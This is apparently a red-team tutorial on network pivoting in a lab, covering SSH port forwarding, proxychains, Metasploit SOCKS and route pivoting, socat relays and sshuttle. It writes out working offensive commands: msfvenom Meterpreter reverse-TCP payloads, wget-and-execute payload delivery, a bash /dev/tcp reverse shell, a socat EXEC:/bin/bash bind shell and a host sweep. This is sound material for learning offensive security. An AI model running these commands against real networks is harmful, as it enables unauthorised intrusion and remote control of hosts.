### Pivoting Techniques

**Pivoting** is a Red Team technique that consists of using a compromised host as a jump point toward other hosts located on an internal network that we cannot access directly from our machine. The compromised host acts as an intermediary or "network bridge", allowing us to reach network segments that would otherwise be inaccessible.

---

**Lateral Movement** is a technique that consists of moving between hosts or systems within the same network or segment, without necessarily jumping between different networks. For example, compromising one computer and from there accessing another computer within the same internal network. Unlike pivoting, it does not involve crossing to a different network segment, but rather moving horizontally within the same infrastructure.

---

**Tunneling** is a technique that consists of encapsulating one protocol inside another with the goal of hiding traffic, evading firewall restrictions, or transporting communications through means that would not normally allow it. A common example is using HTTP/HTTPS to disguise C2 traffic, or DNS Tunneling to exfiltrate data within DNS queries. Tunneling frequently acts as the technical mechanism that makes pivoting possible.


----

# NIC and IP Identification in Pivoting

**What is a NIC?**

The **Network Interface Card (NIC)** is the component that allows a device to communicate on a network. Each NIC has:

- A **MAC address** (unique physical identifier)
- One or more **IP addresses** (logical network identifier)
- Can be **physical** (ethernet, wifi) or **virtual** (loopback, tunnels)

---

**Why is it critical in Pivoting?**

When we compromise a machine, the first thing to do is identify its network interfaces because:

- A machine with **multiple NICs** can be connected to **several networks simultaneously**
- That machine becomes our **jump point (pivot)** toward internal networks that we could not reach before
- It reveals the **internal network topology**

```
[Attacker] → [Compromised Machine] → [Hidden Internal Network]
              eth0: 192.168.1.50      eth1: 10.10.10.1
              (public network)        (internal network)
```

Commands to Identify NICs and IPs

On Linux:

```
ifconfig
```

output:

```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether `aa:bb:cc:dd:ee:ff`  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 6 overruns 0  carrier 0  collisions 0

eno1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether `aa:bb:cc:dd:ee:ff`  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 92  bytes 6960 (6.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 92  bytes 6960 (6.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.10.5  netmask 255.255.255.0  broadcast 192.168.10.255
        inet6 00:1A:2B:3C:4D:5E  prefixlen 64  scopeid 0x20<link>
        ether `aa:bb:cc:dd:ee:ff`  txqueuelen 1000  (Ethernet)
        RX packets 1183794  bytes 1712973080 (1.5 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 647790  bytes 64849005 (61.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

We can observe that the previous result returned **4 NICs**, each with its identifier: `docker0`, `eno1`, `lo`, `wlan0`, followed by configuration information and traffic statistics. **Docker** is a virtual NIC created by Docker to connect locally to Docker images. Similarly, with **TryHackMe** or **HackTheBox** VPNs, a virtual NIC is created that allows us to connect to those machines.

On some Linux systems `ifconfig` is not installed, so if the `ifconfig` command does not work we can use:

```
ip -c a 
ip addr
ip addr show
```

---

On Windows

```
ipconfig
Get-NetIPAddress 
Get-NetAdapter
```

---
We also need to take into account the network routes of each NIC, since not only a router can connect us to the internet — any device can act as a router. We can view these routes with `ip route` or `netstat -r`. On Linux, with **AutoRoute** we can add routes automatically and direct traffic through a pivot host in order to reach internal networks that were previously inaccessible from our machine.

**netstat usage**

```
netstat -r 

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0

```


Many operating systems contain their own routing table, which helps them make routing decisions. For example, when a packet is created and needs to be sent, the system checks the routing table to verify where it needs to send that packet before leaving the machine.


---


### Port Forwarding

**Port Forwarding** is a technique that allows **redirecting network traffic** from a specific port to another host/port, enabling access to services that would otherwise be directly inaccessible.

**Main types of Port Forwarding with SSH:**

```
# Local Port Forwarding
ssh -L [local_port]:[remote_host]:[remote_port] user@server

# Remote Port Forwarding
ssh -R [remote_port]:[local_host]:[local_port] user@server

# Dynamic Port Forwarding (SOCKS Proxy)
ssh -D [local_port] user@server
```

**Local** → You access a remote internal service.

**Remote** → The server accesses one of your services.

**Dynamic** → Creates a SOCKS proxy to route multiple connections.

---


**Local Port Forwarding**

This is when **we (attacker/client)** want to access a service running **internally on the target machine**, which **is not directly accessible** from our machine.

```
[Your Machine] ----SSH----> [Target Machine] ----> [Internal Service]
  localhost:4444                                      127.0.0.1:8080
```

> The target machine has a service running on its **localhost** (e.g.: database, web panel) that **you cannot reach directly**, but it can.

**We start by scanning the target machine**

```
 scapot -t 172.17.0.2 -m top -b


  ______           _______              __
 /      \         /       \            /  |
/$$$$$$  |  _______   ______  $$$$$$$  | ______   _$$ |_
$$ \__$$/  /       | /      \ $$ |__$$ |/      \ / $$   |
$$      \ /$$$$$$$/  $$$$$$  |$$    $$//$$$$$$  |$$$$$$/
 $$$$$$  |$$ |       /    $$ |$$$$$$$/ $$ |  $$ |  $$ | __
/  \__$$ |$$ \_____ /$$$$$$$ |$$ |     $$ \__$$ |  $$ |/  |
$$    $$/ $$       |$$    $$ |$$ |     $$    $$/   $$  $$/
 $$$$$$/   $$$$$$$/  $$$$$$$/ $$/       $$$$$$/     $$$$/


[+] Valid IP address -> 172.17.0.2
=== Scanning Top 90 ports ===

[*] Starting scan...
[*] Version detection activated (-b)
[00:00:00] [████████████████████████████████████████████▓] 89/90 ports (0s)
[+] Port 22     | SSH             | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14

═══════════════════════════════════════════════════
 Scan completed | 1 open port(s)
═══════════════════════════════════════════════════
  ► 22     │ SSH             │ SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
═══════════════════════════════════════════════════
 Detected OS  │ Linux/Unix
═══════════════════════════════════════════════════

```

> This tool is mine, created in Rust

**With Nmap**

```bash
 nmap -p- --open  -sV -Pn -n 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 20:10 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

|Parameter|What it does|
|---|---|
|`nmap`|Runs the port scanning tool|
|`-p-`|Scans **all ports** (from 1 to 65535)|
|`--open`|Shows **only open ports** (filters closed/filtered)|
|`-sV`|Detects the **service version** running on each port|
|`-Pn`|**Does not ping** beforehand, assumes the host is active|
|`-n`|**Does not resolve DNS**, goes directly to the IP (faster)|
|`172.17.0.2`|The **target IP** to scan|

We enter the target machine and verify the **internally running services** and **listening ports** with `ss` or `netstat`

**ss**
```bash
 ss -tlnp
State        Recv-Q       Send-Q             Local Address:Port             Peer Address:Port      Process
LISTEN       0            511                    127.0.0.1:8080                  0.0.0.0:*
LISTEN       0            128                      0.0.0.0:22                    0.0.0.0:*
LISTEN       0            128                         [::]:22                       [::]:*

```

|Parameter|What it does|
|---|---|
|`ss`|Tool to view **network connections and ports**|
|`-t`|Shows only **TCP** connections|
|`-l`|Shows only ports in **listen (LISTEN)** state|
|`-n`|**Does not resolve** names, shows numeric IPs and ports|
|`-p`|Shows the **process** associated with each port|

---

**Netstat** 
```bash
netstat -antp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0     52 172.17.0.2:22           172.17.0.1:54942        ESTABLISHED -
tcp6       0      0 :::22
```

> We don't have **root** privileges, which is why it doesn't show the **PID/Program name** of the processes. With `sudo` it would show completely.

| Parameter | What it does                                                    |
| --------- | --------------------------------------------------------------- |
| `netstat` | Tool to view **active network connections**                     |
| `-a`      | Shows **all** connections (listening and established)           |
| `-n`      | **Does not resolve** names, shows numeric IPs and ports         |
| `-t`      | Shows only **TCP** connections                                  |
| `-p`      | Shows the **process/PID** associated with each connection       |

Now that we know the machine is running a service internally, we will perform `Port Forwarding` with SSH

```
ssh -L 1234:localhost:8080 kain@172.17.0.2
```

| Parameter         | What it does                                              |
| ----------------- | --------------------------------------------------------- |
| `ssh`             | Executes the SSH connection                               |
| `-L`              | Indicates **Local Port Forwarding**                       |
| `1234`            | Port on **your machine** where you will listen            |
| `localhost:8080`  | Final destination as seen **from the target machine**     |
| `kain@172.17.0.2` | Username and IP of the **target machine**                 |

##  Visual flow:
```
[Your Machine]          [Target Machine]
localhost:80  --SSH-->  localhost:8080
     │                       │
     └── You access here     └── Internal web service
```

We verify on our machine that the SSH tunnel has been created correctly, checking that port **1234** is in a listening state.

<img src="/budahacksecurity/uploads/md_images/pv/pv.png" style="max-width:100%; border-radius:8px;">

Once the SSH tunnel is correctly created, we proceed to scan port **1234** on our machine to identify what server or service is running on port **8080** of the target machine.

```bash
nmap -p1234 -sV localhost


PORT     STATE SERVICE VERSION
1234/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

```

We access from the browser at `http://localhost:1234` to view the internal web service

<img src="/budahacksecurity/uploads/md_images/pv/pv2.png" style="max-width:100%; border-radius:8px;">

We could also forward multiple ports in the same SSH command, simply by adding more `-L` flags.

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 kain@172.17.0.2
```


**Dynamic Port Forwarding**

In this technique a **SOCKS proxy** is created on our machine, routing **all traffic** through the target machine, allowing us to access **multiple services or machines** on the internal network without needing to specify a fixed port.

We verify the network interfaces of the machine we gained access to and observe that there is an **eth3** interface pointing to another network (**10.10.10.2**), which is not directly accessible from our attacker machine.

```
root@f8445a3b4d5e:/# ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether b2:3d:c3:99:1e:85  txqueuelen 0  (Ethernet)
        RX packets 202227  bytes 134390202 (134.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 164563  bytes 9450458 (9.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.3  netmask 255.255.254.0  broadcast 10.10.11.255
        ether da:07:21:9b:4e:61  txqueuelen 0  (Ethernet)
        RX packets 38  bytes 9236 (9.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 126 (126.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 483 (483.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 483 (483.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions
```

We create a bash script and execute it directly on the machine we have access to in order to enumerate active hosts on the **10.10.10.2** network.

```bash
for i in $(seq 1 254); do (echo > /dev/tcp/10.10.10.$i/22) &>/dev/null && echo "[+] Active host: 10.10.10.$i"; done
```

<img src="/budahacksecurity/uploads/md_images/pv/pv3.png" style="max-width:100%; border-radius:8px;">

We found another host besides ours `10.10.10.3`, we connect to SSH again:

```
ssh -D 9050 kain@172.17.0.2
```

Once connected, we need to use **proxychains** (or a similar tool) to route the packets from any tool through port 9050.

We install it with:

```bash
sudo pacman -S proxychains
```

As we can see, the configuration file already comes pre-configured to use port `9050`, which is the default port for **TOR** with the socks4 protocol:

```bash
tail -3 /etc/proxychains.conf

# defaults set to "tor"
socks4  127.0.0.1 9050
```

<img src="/budahacksecurity/uploads/md_images/pv/pv4.png" style="max-width:100%; border-radius:8px;">

As we can observe in the following image, we managed to **ping** the internal machine `10.10.10.2` from our attacker machine `172.17.0.1`, using the compromised machine `172.17.0.2` as a **bridge**, which has access to the internal network through its `10.10.10.3` interface.

```bash
 proxychains scapot -t 10.10.10.2 -m top -b
```

We observe that with our **scapot** tool, **2 open ports** were found on the internal machine:

```powershell
═══════════════════════════════════════════════════
 Scan completed | 2 open port(s)
═══════════════════════════════════════════════════
  ► 22     │ SSH             │ SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
  ► 80     │ HTTP            │ Apache/2.4.58 (Ubuntu)
═══════════════════════════════════════════════════
 Detected OS  │ Linux/Unix
═══════════════════════════════════════════════════

```


**Using Nmap**
We confirm the results using **nmap** through the tunnel:

```bash
proxychains nmap -sV -sT -Pn 10.10.10.2 -v
```

```
Initiating NSE at 18:36
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.2:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.2:80  ...  OK
Completed NSE at 18:36, 0.05s elapsed
Nmap scan report for 10.10.10.2
Host is up, received user-set (0.00s latency).
Scanned at 2026-03-06 18:36:38 EST for 7s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Both tools confirm the same results: **SSH on port 22** and **HTTP on port 80**.

 **Accessing the web service**

Upon detecting port 80, we verify its content by opening the browser through the proxy:

```bash
proxychains firefox 10.10.10.2
```

<img src="/budahacksecurity/uploads/md_images/pv/pv5.png" style="max-width:100%; border-radius:8px;">

As can be seen in the image, we successfully accessed the internal machine's website, demonstrating that the **SOCKS tunnel** is working correctly.

Thanks to SSH **dynamic port forwarding**, all traffic we route through proxychains will travel through the tunnel, allowing us to interact with the internal machine `10.10.10.2` **as if it were on our own network**.

---


## Remote Port Forwarding

**Remote Port Forwarding** (`-R`) is a pivoting technique that allows redirecting connections from a remote host toward our attacker machine. Unlike Dynamic Port Forwarding, here we are not the ones initiating connections toward the internal network, but rather **we force the victim to connect to us** through the pivot host.

This technique is especially useful in real environments where there are **restrictive firewalls** that block incoming connections to our machine, but allow internal hosts to connect to each other.


**1. We create the payload with msfvenom**

We generate a Meterpreter payload for Linux pointing to the **pivot** on port `8080`, since the victim has no direct access to our attacker machine:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST=10.10.10.3 \ LPORT=8080  -f elf -o payload.elf
```

**2. We configure the listener in Metasploit**

On our attacker machine `172.17.0.1` we configure the listener on port `8000`:

```powershell
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8000
run
```

**3. We transfer the payload to the pivot**

We copy the payload to the pivot `172.17.0.2` via `scp`:

```bash
scp payload.elf kain@172.17.0.2:~/
```

Then we start an HTTP server on the pivot so the victim can download it:

```bash
python3 -m http.server 8123
```

From the victim `10.10.10.2` we download and grant execution permissions to the payload:

```bash
wget http://10.10.10.3:8123/payload.elf -O /tmp/payload.elf
chmod +x /tmp/payload.elf
```

**4. Create the tunnel with Remote Port Forwarding**

From our attacker machine `172.17.0.1` we establish the remote forwarding. We tell the pivot to listen on port `8080` and forward all traffic to our listener on port `8000`:

```bash
ssh -R 10.10.10.3:8080:0.0.0.0:8000 kain@172.17.0.2 -vN
```

**5. Execute the payload on the victim**

When the payload is executed on `10.10.10.2`, it will connect to the pivot on port `8080`, which will redirect the connection to our listener on port `8000`, establishing the Meterpreter session:


<img src="/budahacksecurity/uploads/md_images/pv/pv6.png" style="max-width:100%; border-radius:8px;">


---

### Pivoting with Meterpreter

So far we have used **SSH** as the basis for our pivoting techniques. However, in real scenarios it is common to gain access to a host through a **Meterpreter** session instead of SSH. In these cases, Metasploit offers its own pivoting tools without needing to rely on SSH tunnels or proxychains.

For this scenario we will start from scratch, obtaining a Meterpreter session on the pivot `172.17.0.2` and from there reach the internal network `10.10.10.0/24`.


**1. Create the payload for the pivot**

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o pivot.elf
```

**2. Configure the listener**

```bash
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 172.17.0.1
set LPORT 4444
run
```

**3. Transfer and execute on the pivot `172.17.0.2`**

```bash
# From your attacker machine, start HTTP server
python3 -m http.server 8080

# From the pivot, download and execute
wget http://172.17.0.1:8080/pivot.elf -O /tmp/pivot.elf
chmod +x /tmp/pivot.elf
./pivot.elf
```

Once the Meterpreter session is obtained on the pivot, we verify the network interfaces of the system to confirm it has access to the internal network:

````bash
meterpreter > ifconfig
```
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : eth0
Hardware MAC : ca:ec:97:f4:e9:50
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.17.0.2
IPv4 Netmask : 255.255.0.0


Interface  3
============
Name         : eth1
Hardware MAC : e2:3f:57:40:e1:83
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 10.10.10.3
IPv4 Netmask : 255.255.254.0
````

We confirm that the pivot has **two network interfaces**, `eth0` connected to our attacker network `172.17.0.0/16` and `eth1` connected to the internal network `10.10.10.0/23`, making it the ideal bridge to reach internal hosts.

---

### Ping Sweep

We use the `ping_sweep` module to discover active hosts on the internal network:

```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/23
```

---

### Metasploit SOCKS Proxy Configuration

In order to route traffic toward the internal network `10.10.10.0/23` through the Meterpreter session, we configure Metasploit's internal SOCKS proxy. This functionality is equivalent to what we were doing with proxychains and SSH, but integrated directly into Metasploit, allowing us to communicate with internal network hosts without external tools.


We send the Meterpreter session to the background and configure Metasploit's internal SOCKS proxy:

```powershell
meterpreter > background
[*] Backgrounding session 1...

msf exploit(multi/handler) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set SRVPORT 9050
msf auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf auxiliary(server/socks_proxy) > set version 4a
msf auxiliary(server/socks_proxy) > run

[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

|Parameter|Value|Description|
|---|---|---|
|`SRVPORT`|`9050`|Port where the SOCKS proxy will listen|
|`SRVHOST`|`0.0.0.0`|Listens on all interfaces|
|`version`|`4a`|SOCKS protocol version|

With the SOCKS proxy running on port `9050`, Metasploit acts as an intermediary to route traffic toward the internal network. Now we need to add a **route** to tell Metasploit which network to reach through the Meterpreter session.

```bash
msf auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

```

Once we verify that the SOCKS proxy is running correctly, we proceed to add the route to the internal network through the Meterpreter session:

```bash
msf auxiliary(server/socks_proxy) > route add 10.10.10.0/23 1
[*] Route added
```

We verify that the route was created correctly:

```bash
msf auxiliary(server/socks_proxy) > route print

IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.254.0      Session 1
```

We confirm that all traffic directed to the `10.10.10.0/23` network will be routed through **session 1** of Meterpreter. With this, Metasploit can reach any host on the internal network directly, without needing proxychains or SSH tunnels.

We use the `scanner/portscan/tcp` auxiliary module to scan host `10.10.10.2` through the Meterpreter tunnel:

```bash
msf auxiliary(server/socks_proxy) > use auxiliary/scanner/portscan/tcp
msf auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.2
msf auxiliary(scanner/portscan/tcp) > set PORTS 1-100
msf auxiliary(scanner/portscan/tcp) > run

[+] 10.10.10.2  - 10.10.10.2:22 - TCP OPEN
[+] 10.10.10.2  - 10.10.10.2:80 - TCP OPEN
[*] 10.10.10.2  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The scan detected ports **22 (SSH)** and **80 (HTTP)** open on the internal machine `10.10.10.2`, confirming that pivoting through Meterpreter is working correctly. Unlike proxychains, no external configuration was necessary, as Metasploit routes traffic internally through the active session.

### Local Port Forwarding with Meterpreter

We return to the Meterpreter session to configure port forwarding. This technique allows us to redirect traffic from port `80` of the **internal victim** `10.10.10.2` to our attacker machine on port `8080`, making it accessible as if it were a local service:


```bash
msf > sessions -i 1

meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.2
[*] Forward TCP relay created: 0.0.0.0:8080 -> 10.10.10.2:80

meterpreter > portfwd list

Active Port Forwards
====================
   Index  Local        Remote         Direction
   -----  -----        ------         ---------
   1      0.0.0.0:8080 10.10.10.2:80  Forward
```

Now we can access the victim's web service directly from our browser:


```bash
firefox http://127.0.0.1:8080
```

<img src="/budahacksecurity/uploads/md_images/pv/pv7.png" style="max-width:100%; border-radius:8px;">


---

### Remote Port Forwarding with Meterpreter

Remote port forwarding in Meterpreter works in reverse — **it exposes a port on your attacker machine toward the victim**. Useful for transferring files or receiving connections from the internal network.

Execute this from the Meterpreter session:

```bash
meterpreter > portfwd add -R -l 4444 -L 172.17.0.1 -p 4444
```

|Flag|Description|
|---|---|
|`-R`|Activates remote mode|
|`-l`|Port that will listen on the victim|
|`-L`|IP of your attacker machine|
|`-p`|Port on your attacker machine to redirect to|

With this, any connection arriving at port `1234` of the victim will be redirected toward port `4444` of our attacker machine `172.17.0.1`.


---

## SOCAT 

**SOCAT** is a Linux terminal tool that allows creating bidirectional communication channels between two network endpoints. It acts as a redirector that can listen on a host and port, and forward that data to another IP address and port. Unlike `netcat`, SOCAT is much more versatile and supports:

|Feature|Description|
|---|---|
|**Protocols**|TCP, UDP, SSL/TLS, UNIX sockets, IPv4, IPv6|
|**Interactive TTY**|Allows obtaining a fully interactive shell with `pty`|
|**Native SSL/TLS**|Traffic encryption without external tools like stunnel|
|**Multiple connections**|With `fork` accepts several simultaneous connections|
|**Pivoting / Relay**|Forwards traffic between different networks without SSH tunnels|
|**Command execution**|Can execute binaries or shells with `EXEC:`|
|**Files and pipes**|Can read/write to files, FIFOs and devices|
|**Port forwarding**|Redirects local ports to remote destinations|

---

**Installation**

To install socat without root privileges, we can download a pre-compiled static binary and run it directly without installation:

```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod +x socat
./socat
```

> This is especially useful on victim machines during a pentest where we don't have installation permissions.


---

## Setting Up SOCAT Listener — Pivoting with Reverse Shell

In this scenario we will use the target machine as a pivot to receive a reverse shell from the internal machine, which is not directly accessible from our attacker machine.

**Connection flow:**

INTERNAL MACHINE -> TARGET MACHINE (pivot) -> ATTACKER (listener)

**Step 1 — Transfer the binary to the target machine**

`Attacker Machine`:

```bash
python3 -m http.server
```

Starts an HTTP server on port 8000 to serve the binary.

`Target Machine`:

```bash
wget http://172.17.0.1:8000/socat -O /tmp/socat
chmod +x /tmp/socat
```

Downloads the binary and grants execution permissions.

<img src="/budahacksecurity/uploads/md_images/pv/pv8.png" style="max-width:100%; border-radius:8px;">

---

**Step 2 — We start the listener**

`Attacker Machine`:

```bash
rustcat -lp 4444
```

Waits to receive the reverse shell.

---

**Step 3 — We start the relay on the pivot**

`Target Machine`:

```bash
./socat TCP4-LISTEN:8080,fork TCP4:172.17.0.1:4444
```

|Parameter|Description|
|---|---|
|`TCP4-LISTEN:8080`|Listens for incoming connections on port 8080|
|`fork`|Creates a child process for each connection|
|`TCP4:172.17.0.1:4444`|Forwards traffic to the attacker on port 4444|

Redirects all traffic arriving on port 8080 toward the attacker on port 4444.

---

**Step 4 — We execute the reverse shell**

`Internal Machine`:

```bash
bash -i >& /dev/tcp/IP_PIVOT/8080 0>&1
```

|Parameter|Description|
|---|---|
|`bash -i`|Executes bash in interactive mode|
|`>&`|Redirects stdout and stderr|
|`/dev/tcp/IP_PIVOT`|TCP connection toward the pivot's IP|
|`/8080`|Port where socat is listening on the pivot|
|`0>&1`|Redirects stdin to the same channel|

Launches an inverse shell toward the pivot, which forwards it to the attacker.

<img src="/budahacksecurity/uploads/md_images/pv/pv9.png" style="max-width:100%; border-radius:8px;">

>rustcat is a tool created in Rust to receive reverse shells and bind shells with full interactive PTY.

We can observe that we have a connection with the internal machine `10.10.10.3`.

---

## Setting Up SOCAT Connect — Pivoting with Bind Shell

In this scenario the internal machine exposes a shell on a fixed port, the target machine acts as a pivot forwarding traffic toward it, and the attacker connects to gain access. Unlike the reverse shell where the victim initiates the connection, in the bind shell it is the attacker who connects.

**Connection flow:**

ATTACKER (connect) -> TARGET MACHINE (pivot) -> INTERNAL MACHINE (listener)


---

**Step 1 — We expose the bind shell on the internal machine**

The internal machine waits listening on a port; any connection that arrives will receive a bash. Since it is not directly accessible from the attacker, the pivot will take care of forwarding the traffic.

`Internal Machine`:

```bash
socat TCP4-LISTEN:9999,fork EXEC:/bin/bash
```

| Parameter          | Description                                        |
| ------------------ | -------------------------------------------------- |
| `TCP4-LISTEN:9999` | Listens for incoming connections on port 9999      |
| `fork`             | Creates a child process for each connection        |
| `EXEC:/bin/bash`   | Executes bash and connects it to the network channel |

---

**Step 2 — We start the relay on the pivot**

The pivot waits listening on port 8080 and forwards all traffic toward the bind shell of the internal machine on port 9999.

`Target Machine`:

```bash
./socat TCP4-LISTEN:8080,fork TCP4:10.10.10.3:9999
```

|Parameter|Description|
|---|---|
|`TCP4-LISTEN:8080`|Listens for incoming connections from the attacker|
|`fork`|Creates a child process for each connection|
|`TCP4:INTERNAL_MACHINE_IP:9999`|Forwards traffic toward the bind shell of the internal machine|

---

**Step 3 — We connect from the attacker**

The attacker connects to the pivot, which transparently forwards the connection to the bind shell of the internal machine, obtaining full access.

`Attacker Machine`:

```bash
rustcat -c 172.17.0.3 -p 8080
```

<img src="/budahacksecurity/uploads/md_images/pv/pv10.png" style="max-width:100%; border-radius:8px;">

---

### Sshuttle

It is a **"transparent VPN"** over SSH written in Python. Unlike proxychains (which requires configuring each tool), sshuttle routes traffic at the operating system level using `iptables`, so **any tool works directly** without additional configuration.


**Installation**

Arch
```bash
sudo pacman -Sy sshuttle
```

Debian/Ubuntu
```bash
sudo apt-get update && apt install sshuttle
```

Fedora
```bash
sudo dnf install -y sshuttle
```



**Using Sshuttle**

To use sshuttle as a pivot point, we use the `-r` flag to establish a remote connection with username and password (same as SSH), followed by the **internal network** we want to route through the pivot host:

```bash
sudo sshuttle -r pivot@172.18.0.2 10.10.10.0/24 -V
```

```bash
c : Starting firewall manager with command: ['/usr/bin/sshuttle', '-v', '--method', 'auto', '--firewall']
fw: Starting firewall with Python version 3.14.3
fw: ready method name nat.
c : Using default IPv4 listen address 127.0.0.1
c : IPv6 enabled: Using default IPv6 listen address ::1
c : Method: nat
c : IPv4: on
c : IPv6: on
c : UDP : off (not available with nat method)
c : DNS : off (available)
c : User: off (available)
c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
c :   (<AddressFamily.AF_INET: 2>, '10.10.10.0', 24, 0, 0)
c : Subnets to exclude from forwarding:
c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
c : TCP redirector listening on ('::1', 12300, 0, 0).
c : TCP redirector listening on ('127.0.0.1', 12300).
c : Starting client with Python version 3.14.3
c : Connecting to server...
pivot@172.18.0.2's password:
 s: Running server on remote host with /usr/bin/python3 (version 3.12.3)
 s: latency setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 10.10.10.0/24 -p tcp --to-ports 12300
